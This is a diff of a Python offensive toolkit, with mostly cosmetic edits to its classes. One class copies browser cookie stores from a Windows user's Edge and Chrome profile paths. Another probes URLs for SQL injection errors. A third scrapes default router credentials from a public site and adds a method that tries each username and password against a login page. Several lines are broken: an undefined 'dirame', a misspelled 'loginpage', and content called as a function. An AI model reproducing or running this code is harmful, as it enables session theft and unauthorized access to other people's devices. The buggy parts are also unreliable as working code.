@@ -159,26 +159,26 @@ class Scrape(object):
             print(error)
 
     def scrape(self):
-        for link in self.href_parser.findAll('a'):
-            print(link.get('href'))
+        for link in self.href_parser.findAll("a"):
+            print(link.get("href"))
 
 
 class Cookiemonster(object):
     '''Fetches locally stored cookies'''
     def __init__(self):
         self.files = []
-        self.user = os.environ.get('USERNAME')
-        self.cookie_paths = ['C:\\users\\{}\\AppData\\Local\\MicrosoftEdge\\Cookies'.format(self.user),
-                                'C:\\users\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetCookies'.format(self.user),
-                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\MicrosoftEdge\\Cookies'.format(self.user),
-                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\INetCookies'.format(self.user),
-                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\Cookies'.format(self.user),
-                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\User\\Default\\DOMStore'.format(self.user),
-                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\INetCookies'.format(self.user),
-                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\Cookies'.format(self.user),
-                                'C:\\users\\{}\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\User\\Default\\DOMStore'.format(self.user),
-                                'C:\\users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies'.format(self.user),
-                                'C:\\Users\\{}\\AppData\\Local\\Microsoft\\Windows\\INetCookies'.format(self.user)]
+        self.lap = os.environ.get("localappdata")
+        self.cookie_paths = ["{}\MicrosoftEdge\\Cookies".format(self.lap),
+                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetCookies".format(self.lap),
+                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\MicrosoftEdge\\Cookies".format(self.lap),
+                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\INetCookies".format(self.lap),
+                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\Cookies".format(self.lap),
+                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\User\\Default\\DOMStore".format(self.lap),
+                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\INetCookies".format(self.lap),
+                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\Cookies".format(self.lap),
+                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\User\\Default\\DOMStore".format(self.lap),
+                                "{}\Google\\Chrome\\User Data\\Default\\Cookies".format(self.lap),
+                                "{}\Microsoft\\Windows\\INetCookies".format(self.lap)]
 
     def __len__(self):
         for paths in self.cookie_paths:
@@ -206,14 +206,14 @@ class Cookiemonster(object):
                 except Exception as e:
                     pass
 
-    def save(self, path, dirname):
-        cookiejar = os.path.join(path, dirname)
-        if not os.path.exists(cookiejar):
+    def save(self, path, dir_name):
+        cookie_jar = os.path.join(path, dir_name)
+        if not os.path.exists(cookie_jar):
             os.mkdir(dirame)
             for paths in self.cookie_paths:
                 for file in os.listdir(paths):
                     try:
-                        copy(os.path.join(paths, file), cookiejar)
+                        copy(os.path.join(paths, file), cookie_jar)
                     except Exception as e:
                         pass
 
@@ -274,7 +274,8 @@ class SQLInject(object):
 
     def urlinject(self, injection):
         page = requests.get(self.url + injection)
-        errors = re.findall('You have an error in your SQL syntax;', page.content)
+        errors = re.findall('You have an error in your SQL syntax;',
+                            page.content.decode())
         for error in errors:
             if error:
                 self.errors.append(error)
@@ -283,19 +284,17 @@ class SQLInject(object):
 
     def forminject(self, injection):
         page = request.post(self.url, data=injection)
-
+        return page.content()
 
 class RouterDAuth(object):
     '''Router Default Authentication Check'''
     def __init__(self):
         self.page = "http://www.routerpasswords.com/"
+        self.login_page = ""
         self.models = []
         self.protocols = []
         self.usernames = []
         self.passwords = []
-
-    def __len__(self):
-        pass
 
     def __enter__(self):
         return self
@@ -304,13 +303,12 @@ class RouterDAuth(object):
         if error:
             print(error)
 
-    def getpasswords(self, router):
+    def getpasswords(self, router_name):
         payload = {"findpass": "1",
-                    "router": router,
+                    "router": router_name,
                     "findpassword": "Find Password"}
         page = requests.post(self.page, data=payload)
         parser = BeautifulSoup(page.content, 'html.parser')
-
         for table_rows in parser.find_all('tr')[1:]:
             table_data = table_rows.find_all('td')
             self.models.append(table_data[1].text)
@@ -318,5 +316,14 @@ class RouterDAuth(object):
             self.usernames.append(table_data[3].text)
             self.passwords.append(table_data[4].text)
 
-    def check(self):
-        pass
+    def target(self, login_page):
+        self.login_page = login_page
+        return login_page
+
+    def check(self, usernames, passwords):
+        for username in usernames:
+            for password in passwords:
+                page = requests.get(self.loginpage, auth=(username, password))
+                if page.status_code == 200:
+                    return True
+        return False
